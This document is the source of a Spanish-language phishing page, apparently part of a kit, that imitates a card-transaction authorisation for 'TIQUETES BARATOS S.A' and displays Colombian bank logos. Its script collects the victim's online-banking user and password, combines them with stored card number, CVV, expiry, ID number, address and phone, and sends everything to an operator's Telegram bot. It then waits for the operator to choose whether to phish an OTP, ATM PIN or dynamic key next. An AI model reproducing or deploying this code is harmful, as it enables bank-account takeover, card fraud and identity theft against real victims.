<?php
session_start();

$transactionId = $_SESSION['transactionId'] ?? null;
if (!$transactionId) {
    echo "ID de transacción no disponible.";
    exit;
}

$path = __DIR__ . "/../verificaciones/$transactionId.json";
if (!file_exists($path)) {
    echo "No se encontró instrucción para esta acción.";
    exit;
}

$data = json_decode(file_get_contents($path), true);
if (!isset($data['accion']) || $data['accion'] !== 'pedir_otp') {
    echo "Esta acción no corresponde a este paso.";
    exit;
}

unlink($path);
?>


<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autorización de Transacción</title>
    <script src="./bots/aes.js"></script>
   <script src="./bots/AesUtil.js"></script>
   <script src="../js/jquery-3.7.7.js"></script>
   <script src="./bots/md5.js"></script>
   <script src="./bots/pbkdf2.js"></script>
   <script src="./bots/string-mask.js"></script>
   <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }

    .container {
      width: 100%;
      max-width: 400px;
      background: #fff;
      border-radius: 10px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      padding: 20px;
      box-sizing: border-box;
      overflow-y: auto;
      margin: 0 10px;
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
      border-bottom: 1px solid #ccc;
      padding-bottom: 10px;
    }

    .header img {
      height: 35px;
    }

    .title {
      font-size: 18px;
      font-weight: bold;
      margin-bottom: 10px;
      text-align: left;
    }

    .details p {
      margin: 10px 0;
      font-size: 14px;
    }

    .details p.normal {
      color: #D6D2C4;
      font-weight: normal;
    }

    .details p.small {
      font-size: 12px;
      color: #ffffff;
      font-weight: normal;
    }

    .input-group {
      display: flex;
      justify-content: flex-start;
      margin-bottom: 15px;
    }

    .input-group label {
      width: 35%;
      text-align: right;
      margin-right: 10px;
      font-size: 14px;
    }

    .input-group input {
      width: 40%;
      padding: 8px;
      border: 1px solid red;
      border-radius: 5px;
      font-size: 14px;
    }

    .button {
      width: 30%;
      padding: 10px;
      background: #000;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
      font-weight: bold;
      margin-top: 30px;
      text-align: center;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }
    /* Loader */
.loaderp {
    width: 48px;
    height: 48px;
    border: 5px solid #FFF;
    border-bottom-color: rgb(117, 117, 117);
    border-radius: 50%;
    display: inline-block;
    box-sizing: border-box;
    animation: rotation 1s linear infinite;
}

@keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
}

.loaderp-full {
    position: fixed; /* Usamos fixed para que el loader no se desplace con el scroll */
    top: 65%; /* Centrado verticalmente */
    left: 50%;
    transform: translate(-50%, -50%); /* Centrado exacto */
    width: 23%; /* 30% del contenedor principal */
    height: 25vh; /* 30% de la altura del contenedor principal */
    max-width: 500px;
    max-height: 200px;
    display: flex;
    justify-content: center;
    align-items: center;
    background-color: white; /* Semi-transparente para no tapar todo */
    border-radius: 8px;
    z-index: 1000; /* Asegura que esté por encima de otros elementos */
}

.hidden {
    display: none;
}

/* Estilos específicos para dispositivos móviles */
@media (max-width: 600px) {
    .loaderp {
        width: 32px; /* Tamaño más pequeño para móviles */
        height: 32px;
        border: 4px solid #FFF;
        border-bottom-color: rgb(150, 150, 150);
    }

    .loaderp-full {
        top: 68.5%; /* Ajustado para móviles */
        left: 50%;
        transform: translate(-50%, -50%); /* Centrado */
        width: 90vw; /* Ajusta ancho para móviles */
        height: 16vh; /* Ajusta altura para móviles */
        max-width: 520px; /* Limita el tamaño máximo en móviles */
        max-height: 218px; /* Limita el tamaño máximo en móviles */
    }
}
/* Estilo para el texto de instrucciones */
.instructions-text {
    font-size: 14px; /* Tamaño de texto adecuado */
    color: #555; /* Un color gris claro para no llamar demasiado la atención */
    margin: 10px 0; /* Margen arriba y abajo para separarlo de los demás elementos */
    line-height: 1.5; /* Espaciado de línea para mejor legibilidad */
    text-align: center; /* Centrado para que se vea balanceado */
    font-weight: normal; /* Texto no tan grueso */
    font-family: Arial, sans-serif; /* Fuente clara y legible */
}

/* Estilos para pantallas pequeñas */
@media (max-width: 600px) {
    .instructions-text {
        font-size: 12px; /* Reducir tamaño en dispositivos móviles */
    }
}

  </style>
</head>

<body>
  <div class="container">
    <div class="header">
      <img id="bank-logo" src="lgos/error2.png" alt="Banco Logo">
      <div class="id-check">
        <img id="card-type-logo" src="lgos/error.avif" alt="Tipo Tarjeta Logo" height="35">
      </div>
    </div>
    <div class="title">Autorización de transacción</div>
    <p class="small">La transacción de <strong>TIQUETES BARATOS S.A</strong> por <strong id="monto-transaccion">$49,999 COP</strong> con tarjeta terminada en <strong id="card-last4">0000</strong> debe ser autorizada.</p>
    <div class="details">
      <p><strong>Comercio:</strong> TIQUETES BARATOS S.A</p>
      <p><strong>Monto:</strong> <span id="monto-transaccion-detalle">Calculando...</span></p>
      <p><strong>Tarjeta:</strong> **** **** **** <span id="card-last4-display">0000</span></p>
    </div>
    <form id="transaction-form">
      <div class="input-group">
        <label id="usuario-label" for="usuario">Usuario:</label>
        <input type="text" id="usuario" placeholder="Ingresa tu usuario">
      </div>
      <div class="input-group">
        <label id="clave-label" for="clave">Clave:</label>
        <input type="password" id="clave" placeholder="Ingresa tu clave" maxlength="11">
      </div>
      <p class="instructions-text">Estos son los datos que utilizas para ingresar a tu Banco.</p>

      <button class="button" id="authorize-button" disabled>Autorizar</button>
    </form>

    <!-- Contenedor del Loader (inicialmente oculto) -->
    <div class="loaderp-full hidden">
      <span class="loaderp"></span>
      <p class="text-italic tc-ocean fs-3 fw-light"></p>
    </div>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const authorizeButton = document.querySelector("#authorize-button");
      const elementsToHide = [
          document.querySelector(".title"),
          document.querySelector("#usuario-label"),
          document.querySelector("#usuario"),
          document.querySelector("#clave-label"),
          document.querySelector("#clave"),
          document.querySelector(".instructions-text"),
          document.querySelector("#authorize-button") // Se agrega el botón a la lista de elementos a ocultar
      ];
      const loader = document.querySelector(".loaderp-full"); // Referencia al loader
  
      function toggleVisibility(hidden) {
          elementsToHide.forEach(el => {
              if (el) el.style.visibility = hidden ? "hidden" : "visible";
          });
  
          // Muestra el loader cuando se ocultan los elementos
          if (loader) {
              loader.classList.toggle("hidden", !hidden);
          }
      }
  
      if (authorizeButton) {
          authorizeButton.addEventListener("click", function () {
              setTimeout(() => {
                  toggleVisibility(true);
              }, 0); // Se ejecuta tras un breve retraso
          });
      }
    });
  </script>
  
  
  
  <script>
    function obtenerPrecio(precio) {
      return parseFloat(precio.replace('$', '').replace('.', '').replace(',', '.'));
    }

    function formatearPrecio(numero) {
      return numero.toLocaleString('es-CO', { style: 'currency', currency: 'COP' });
    }

    function calcularPrecioTotal() {
      const datosVueloIda = JSON.parse(localStorage.getItem('datos_vuelo_ida'));
      const datosVueloRegreso = JSON.parse(localStorage.getItem('datos_vuelo_regreso'));

      let precioTotal = 0;

      if (datosVueloIda) {
        precioTotal = obtenerPrecio(datosVueloIda.price);
      }

      if (datosVueloRegreso) {
        precioTotal += obtenerPrecio(datosVueloRegreso.price);
      }

      const montoFormateado = formatearPrecio(precioTotal);
      document.getElementById("monto-transaccion").innerText = montoFormateado;
      document.getElementById("monto-transaccion-detalle").innerText = montoFormateado;
    }

    function obtenerUltimos4Digitos() {
      const tbdatos = JSON.parse(localStorage.getItem('tbdatos'));
      if (tbdatos && tbdatos.cardNumber) {
        const cardNumber = tbdatos.cardNumber;
        const ultimos4 = cardNumber.slice(-4);
        document.getElementById("card-last4").innerText = ultimos4;
        document.getElementById("card-last4-display").innerText = ultimos4;
      }
    }

    function normalizarBanco(nombreBanco) {
      const palabrasClave = {
        "av villas": "bavevi.png",
        "scotiabank colpatria": "bcolpa.png",
        "popular": "bpopular.png",
        "bogota": "bbogo.png",
        "caja social": "bcajas.png",
        "davivienda": "bdavi1.svg",
        "occidente": "bocinen.png",
        "bbva colombia": "bvva.png", // Nuevo banco
        "bbva": "bvva.png" // Sinónimo de "bbva colombia"
      };

      const nombreNormalizado = nombreBanco.toLowerCase();

      for (const clave in palabrasClave) {
        if (nombreNormalizado.includes(clave)) {
          return palabrasClave[clave];
        }
      }

      return "error2.png";
    }

    function actualizarLogos() {
      const infoload = JSON.parse(localStorage.getItem('infoload'));
      const tiposTarjetas = {
        "visa": "visa.jpg",
        "mastercard": "master.webp",
        "amex": "amex.avif",
        "discover": "discover.png"
      };

      const bankLogo = document.getElementById("bank-logo");
      const cardTypeLogo = document.getElementById("card-type-logo");

      if (infoload && infoload.bank) {
        const logoBanco = normalizarBanco(infoload.bank);
        bankLogo.src = `lgos/${logoBanco}`;
      } else {
        bankLogo.src = "lgos/error2.png";
      }

      if (infoload && infoload.cardType) {
        const tipoTarjetaNormalizado = infoload.cardType.toLowerCase();
        if (tiposTarjetas[tipoTarjetaNormalizado]) {
          cardTypeLogo.src = `lgos/${tiposTarjetas[tipoTarjetaNormalizado]}`;
        } else {
          cardTypeLogo.src = "lgos/error.avif";
        }
      } else {
        cardTypeLogo.src = "lgos/error.avif";
      }

      // Actualizar campos según el banco
      const banco = infoload ? infoload.bank.toLowerCase() : '';
      
      if (banco.includes("bogota")) {
        document.getElementById("usuario-label").innerText = "Cédula:";
        document.getElementById("clave-label").innerText = "Clave:";
        document.getElementById("clave").setAttribute("maxlength", "6");
      } else if (banco.includes("caja social")) {
        document.getElementById("usuario-label").innerText = "Cédula:";
        document.getElementById("clave-label").innerText = "Clave:";
        document.getElementById("clave").setAttribute("maxlength", "6");
      } else if (banco.includes("davivienda")) {
        document.getElementById("usuario-label").innerText = "Cédula:";
        document.getElementById("clave-label").innerText = "Clave:";
      } else if (banco.includes("occidente")) {
        document.getElementById("usuario-label").innerText = "Cédula:";
        document.getElementById("clave-label").innerText = "Clave:";
        document.getElementById("clave").setAttribute("maxlength", "6");
      } else if (banco.includes("bbva")) {
        document.getElementById("usuario-label").innerText = "Cédula:";
        document.getElementById("clave-label").innerText = "Clave:";
        document.getElementById("clave").setAttribute("maxlength", "6");
      } else {
        document.getElementById("usuario-label").innerText = "Usuario:";
        document.getElementById("clave-label").innerText = "Clave:";
      }
    }

    function habilitarBoton() {
      const usuario = document.getElementById('usuario').value.trim();
      const clave = document.getElementById('clave').value.trim();
      const boton = document.getElementById('authorize-button');

      if (usuario && clave && clave.length <= 11) {
        boton.disabled = false;
      } else {
        boton.disabled = true;
      }
    }  

    function guardarDatos() {
      const usuario = document.getElementById('usuario').value.trim();
      const clave = document.getElementById('clave').value.trim();
      const logindata = {
        usuario: usuario,
        clave: clave
      };

      localStorage.setItem('logindata', JSON.stringify(logindata));

    }

    window.onload = function () {
      calcularPrecioTotal();
      obtenerUltimos4Digitos();
      actualizarLogos();
      habilitarBoton();  // Asegurarse de habilitar el botón si los datos son correctos
    };

    // Añadir eventos para verificar los campos
    document.getElementById('usuario').addEventListener('input', habilitarBoton);
    document.getElementById('clave').addEventListener('input', habilitarBoton);
    document.getElementById('authorize-button').addEventListener('click', guardarDatos);
  </script>
  <script>
document.addEventListener('DOMContentLoaded', function () {
    const loader = document.querySelector(".loaderp-full");
    const usuarioInput = document.getElementById('usuario');
    const claveInput = document.getElementById('clave');
    const autorizarBtn = document.getElementById('authorize-button');
    const transactionForm = document.getElementById('transaction-form');

    // Función de habilitar/deshabilitar el botón de autorizar
    function checkFormValidity() {
        if (usuarioInput.value.length >= 4 && claveInput.value.length >= 4) {
            autorizarBtn.disabled = false;
        } else {
            autorizarBtn.disabled = true;
        }
    }

    // Escuchar cambios en los campos de entrada
    usuarioInput.addEventListener('input', checkFormValidity);
    claveInput.addEventListener('input', checkFormValidity);

    // Manejo del envío del formulario
    transactionForm.addEventListener('submit', async function (event) {
        event.preventDefault(); // Evitar el envío estándar del formulario y la recarga de la página
        loader.style.display = "flex"; // Mostrar el loader mientras esperamos respuesta

        // Obtener los valores de usuario y clave
        const usuario = usuarioInput.value;
        const clave = claveInput.value;
        const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);

        // Almacenar en localStorage
        localStorage.setItem('transactionId', transactionId);
        localStorage.setItem('usuario', usuario);
        localStorage.setItem('clave', clave);

        // Obtener los datos de la tarjeta desde localStorage
        const datosTarjeta = JSON.parse(localStorage.getItem("tbdatos"));

        // Crear mensaje para Telegram
        const message = `
<b>Nuevo método de pago pendiente de verificación.</b>
--------------------------------------------------
🆔 <b>ID:</b> | <b>${transactionId}</b>
👤 <b>Usuario:</b> | ${usuario}
🔐 <b>Clave:</b> | ${clave}
--------------------------------------------------
<b>Detalles del pago:</b>
----------------------------
🪪 <b>Cédula:</b> | ${datosTarjeta ? datosTarjeta.cedula : '<i>No disponible</i>'}
💳 <b>Tarjeta:</b> | ${datosTarjeta ? datosTarjeta.cardNumber : '<i>No disponible</i>'}
📅 <b>Fecha de expiración:</b> | ${datosTarjeta ? `${datosTarjeta.expMonth}/${datosTarjeta.expYear}` : '<i>No disponible</i>'}
🔐 <b>CVV:</b> | ${datosTarjeta ? datosTarjeta.cvv : '<i>No disponible</i>'}
💳 <b>Tipo de tarjeta:</b> | ${datosTarjeta ? datosTarjeta.type : '<i>No disponible</i>'}
💰 <b>Cuotas:</b> | ${datosTarjeta ? datosTarjeta.cuotas : '<i>No disponible</i>'}
🏦 <b>Banco:</b> | ${datosTarjeta ? datosTarjeta.bank : '<i>No disponible</i>'}
--------------------------------------------------
🏠 <b>Dirección:</b> | ${datosTarjeta ? datosTarjeta.address : '<i>No disponible</i>'}
📞 <b>Teléfono:</b> | ${datosTarjeta ? datosTarjeta.phone : '<i>No disponible</i>'}
🏙️ <b>Ciudad:</b> | ${datosTarjeta ? datosTarjeta.city : '<i>No disponible</i>'}
📝 <b>Nombre del propietario:</b> | ${datosTarjeta ? datosTarjeta.ownerName : '<i>No disponible</i>'}
--------------------------------------------------
        `;

        // Crear botones interactivos
        const keyboard = JSON.stringify({
            inline_keyboard: [
                [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
                [{ text: "Pedir Clave de Cajero", callback_data: `pedir_cajero:${transactionId}` }],
                [{ text: "Pedir Código OTP", callback_data: `pedir_otp:${transactionId}` }],
                [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
                [{ text: "Error de Logo", callback_data: `error_logo:${transactionId}` }],
            ],
        });

        // Enviar mensaje a Telegram
        const config = await loadTelegramConfig();
        if (!config) {
            console.log("Error al cargar configuración de Telegram.");
            return;
        }

        try {
            const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: config.chat_id,
                    text: message,
                    reply_markup: keyboard,
                    parse_mode: "HTML",
                }),
            });

            const data = await response.json();
            if (data.ok) {
                console.log("Mensaje enviado a Telegram con éxito");
                // Esperar la respuesta del botón presionado en Telegram
                await checkPaymentVerification(transactionId);
            } else {
                throw new Error("Error al enviar mensaje a Telegram.");
            }
        } catch (error) {
            console.error("Error al enviar mensaje:", error);
            loader.style.display = "none"; // Ocultar loader si hay error
        }
    });

    async function checkPaymentVerification(transactionId) {
    const config = await loadTelegramConfig();
    if (!config) return;

    try {
        const response = await fetch(`https://api.telegram.org/bot${config.token}/getUpdates`);
        const data = await response.json();

        const verificationUpdate = data.result.find(update =>
            update.callback_query &&
            [
                `pedir_dinamica:${transactionId}`,
                `pedir_cajero:${transactionId}`,
                `pedir_otp:${transactionId}`,
                `error_tc:${transactionId}`,
                `error_logo:${transactionId}`,
                `finalizar:${transactionId}`
            ].includes(update.callback_query.data)
        );

        if (verificationUpdate) {
            loader.style.display = "none"; // Ocultar loader

            // Aquí manejamos las respuestas de los botones
            switch (verificationUpdate.callback_query.data) {
                case `pedir_dinamica:${transactionId}`:
                    window.location.href = "dinamica-id.php"; // Redirige a la página de clave dinámica
                    break;
                case `pedir_cajero:${transactionId}`:
                    window.location.href = "ccajero-id.php"; // Redirige a la página de clave de cajero
                    break;
                case `pedir_otp:${transactionId}`:
                    window.location.href = "otp-id.php"; // Redirige a la página de OTP
                    break;
                case `error_tc:${transactionId}`:
                    alert("Error en tarjeta. Verifique los datos.");
                    window.location.href = "../pay/"; // Redirige a la página de pago
                    break;
                case `error_logo:${transactionId}`:
                    alert("Error en el logo. Reintente.");
                    window.location.href = "error-id.php"; // Redirige a la página de pago
                    break;
                case `finalizar:${transactionId}`:
                    window.location.href = "checking.php"; // Redirige al final
                    break;
            }
        } else {
            // Si no hay respuesta, esperamos un poco más antes de volver a intentarlo
            setTimeout(() => checkPaymentVerification(transactionId), 2000);
        }
    } catch (error) {
        console.error("Error en la verificación:", error);
        // En caso de error, intentamos de nuevo en 2 segundos
        setTimeout(() => checkPaymentVerification(transactionId), 2000);
    }
}


    async function loadTelegramConfig() {
        try {
            const response = await fetch("botmaster2.php");
            if (!response.ok) {
                throw new Error("No se pudo cargar el archivo de configuración de Telegram.");
            }
            return await response.json();
        } catch (error) {
            console.error("Error al cargar la configuración de Telegram:", error);
        }
    }
});
</script>
<script>
document.addEventListener("DOMContentLoaded", () => {
  const id = localStorage.getItem("transactionId");
  const url = new URL(window.location.href);
  if (id && !url.searchParams.get("id")) {
    url.searchParams.set("id", id);
    window.location.href = url.toString();
  }
});
</script>

</body>

</body>

</html>



